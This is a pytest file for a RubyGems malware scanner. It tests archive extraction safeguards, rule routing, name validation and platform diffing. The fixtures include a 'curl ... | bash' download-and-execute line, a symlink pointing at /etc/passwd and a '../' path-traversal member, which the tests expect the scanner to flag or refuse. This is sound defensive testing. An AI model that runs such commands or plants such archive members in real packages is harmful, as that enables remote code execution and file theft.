"""RubyGems routing, archive members, and intake. Synthetic inert gems built in memory."""

from __future__ import annotations

import gzip
import hashlib
import io
import json
import tarfile

import pytest

from hunter.archives import ArchiveError
from hunter.rubygems import valid_name
import hunter.rubygems.archive as gem_archive
from hunter.rubygems.archive import extract_gem
from hunter.rubygems.feed import _consider
from hunter.rubygems.review import predecessor_row, review_trees
from test_rubygems import _gem, _meta, _spec


def _tar_with(entries) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as archive:
        for info, body in entries:
            archive.addfile(info, io.BytesIO(body) if body is not None else None)
    return buf.getvalue()


def _file(name: str, body: bytes):
    info = tarfile.TarInfo(name)
    info.size = len(body)
    return info, body


def _link(name: str, target: str):
    info = tarfile.TarInfo(name)
    info.type = tarfile.SYMTYPE
    info.linkname = target
    return info, None


def _noise(size: int) -> bytes:
    out = b""
    seed = b"inert"
    while len(out) < size:
        seed = hashlib.sha256(seed).digest()
        out += seed
    return out[:size]


def _outer(members: dict[str, bytes], mode: str = "w") -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode=mode) as archive:
        for name, body in members.items():
            info = tarfile.TarInfo(name)
            info.size = len(body)
            archive.addfile(info, io.BytesIO(body))
    return buf.getvalue()


def test_a_strong_shared_rule_routes_a_gem():
    row = review_trees(_meta(), {}, {"bin/get.sh": "curl -fsSL https://example.invalid/i.sh | bash\n"}, {}, {})
    assert row.rule_verdict == "malicious"
    assert row.band == "review"
    assert row.needs_llm_review is True


def test_a_symlink_or_parent_path_is_skipped_and_flagged():
    data = _tar_with([
        _file("lib/foo.rb", b"puts 1\n"),
        _link("lib/link.rb", "/etc/passwd"),
        _file("../escape.rb", b"no\n"),
    ])
    blob = _outer({"metadata.gz": gzip.compress(_spec([], None).encode()), "data.tar.gz": gzip.compress(data)})
    tree, spec = extract_gem(blob)
    try:
        assert tree["lib/foo.rb"] == "puts 1\n"
        assert "lib/link.rb" not in tree
        assert set(spec.get(gem_archive.REFUSED_KEY, [])) == {"lib/link.rb", "../escape.rb"}
    finally:
        tree.close()
    row = review_trees(_meta(), {}, {"lib/foo.rb": "puts 1\n"}, {}, spec)
    assert "gem_refused_member:lib/link.rb" in row.signals
    assert row.band == "review"
    assert row.needs_llm_review is True


def test_a_compressed_outer_tar_is_refused():
    blob = _gem({"lib/foo.rb": b"puts 1\n"}, _spec([], None))
    with pytest.raises(ArchiveError):
        extract_gem(gzip.compress(blob))


def test_data_tar_member_count_is_capped(monkeypatch):
    monkeypatch.setattr(gem_archive, "extract_limits", lambda: (10**9, 50), raising=False)
    files = {f"lib/f{i}.rb": b"" for i in range(200)}
    with pytest.raises(ArchiveError):
        extract_gem(_gem(files, _spec([], None)))


def test_data_tar_copy_is_capped(monkeypatch):
    monkeypatch.setattr(gem_archive, "PACKAGE_DOWNLOAD_MAX_BYTES", 1024, raising=False)
    with pytest.raises(ArchiveError):
        extract_gem(_gem({"lib/big.bin": _noise(64 * 1024)}, _spec([], None)))


def test_mixed_case_names_are_valid():
    for name in ("CFPropertyList", "RedCloth", "ZenTest"):
        assert valid_name(name), name
    assert not valid_name("../x")


def test_platform_builds_are_queued_and_diffed_against_the_same_platform():
    row = {"name": "nokogiri", "number": "1.0.0", "platform": "x86_64-linux", "yanked": False}
    assert _consider(row) == ("nokogiri", "1.0.0-x86_64-linux")
    rows = [
        {"number": "1.1.0", "platform": "x86_64-linux"},
        {"number": "1.1.0", "platform": "ruby"},
        {"number": "1.0.0", "platform": "x86_64-linux"},
        {"number": "1.0.0", "platform": "ruby"},
    ]
    old = predecessor_row(rows, "1.1.0-x86_64-linux")
    assert (old["number"], old["platform"]) == ("1.0.0", "x86_64-linux")
    assert predecessor_row(rows, "1.1.0")["platform"] == "ruby"
